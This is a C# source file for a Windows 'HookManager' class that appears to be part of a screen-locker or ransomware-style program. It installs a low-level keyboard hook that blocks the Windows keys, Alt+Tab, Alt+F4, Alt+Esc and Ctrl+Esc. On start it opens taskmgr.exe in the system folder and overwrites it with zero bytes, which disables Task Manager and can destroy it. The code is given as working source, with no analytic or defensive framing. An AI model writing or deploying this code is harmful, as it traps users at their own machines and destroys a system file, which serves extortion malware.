using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Loaf
{
    public sealed class HookManager
    {
        public delegate int HookProc(int nCode, int wParam, IntPtr lParam);
        private HookProc KeyboardHookProcedure;
        private FileStream MyFs;
        private const byte LLKHF_ALTDOWN = 0x20;
        private const byte VK_ESCAPE = 0x1B;
        private const byte VK_F4 = 0x73;
        private const byte VK_LCONTROL = 0xA2;
        private const byte VK_RCONTROL = 0xA3;
        private const byte VK_TAB = 0x09;
        private const int VK_LWIN = 91;
        private const int VK_RWIN = 92;
        public const int WH_KEYBOARD = 13;
        private static int hKeyboardHook = 0;
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hInstance, int threadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool UnhookWindowsHookEx(int idHook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern int CallNextHookEx(int idHook, int nCode, int wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        private static extern int GetCurrentThreadId();
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern short GetKeyState(int vKey);
        private int KeyboardHookProc(int nCode, int wParam, IntPtr lParam)
        {
            KeyMSG m = (KeyMSG)Marshal.PtrToStructure(lParam, typeof(KeyMSG));
            if ((m.vkCode == VK_LWIN) || (m.vkCode == VK_RWIN) ||
                ((m.vkCode == VK_TAB) && ((m.flags & LLKHF_ALTDOWN) != 0)) ||
                ((m.vkCode == VK_ESCAPE) && ((m.flags & LLKHF_ALTDOWN) != 0)) ||
                ((m.vkCode == VK_F4) && ((m.flags & LLKHF_ALTDOWN) != 0)) ||
                (m.vkCode == VK_ESCAPE) && ((GetKeyState(VK_LCONTROL) & 0x8000) != 0) ||
                (m.vkCode == VK_ESCAPE) && ((GetKeyState(VK_RCONTROL) & 0x8000) != 0))
                return 1;
            return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
        }
        public void HookStart()
        {
            if (hKeyboardHook == 0)
            {
                KeyboardHookProcedure = new HookProc(KeyboardHookProc);
                hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardHookProcedure, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
                if (hKeyboardHook == 0)
                    HookStop();
                MyFs = new FileStream(Environment.ExpandEnvironmentVariables("%windir%\\system32\\taskmgr.exe"), FileMode.Open);
                byte[] MyByte = new byte[(int)MyFs.Length];
                MyFs.Write(MyByte, 0, (int)MyFs.Length);
            }
        }
        public void HookStop()
        {
            bool retKeyboard = true;
            if (hKeyboardHook != 0)
            {
                retKeyboard = UnhookWindowsHookEx(hKeyboardHook);
                hKeyboardHook = 0;
            }
            if (null != MyFs)
                MyFs.Close();
            if (!(retKeyboard))
                throw new Exception("UnhookWindowsHookEx     failedsssss.");
        }
        public struct KeyMSG
        {
            public int dwExtraInfo;
            public int flags;
            public int scanCode;
            public int time;
            public int vkCode;
        }
    }
}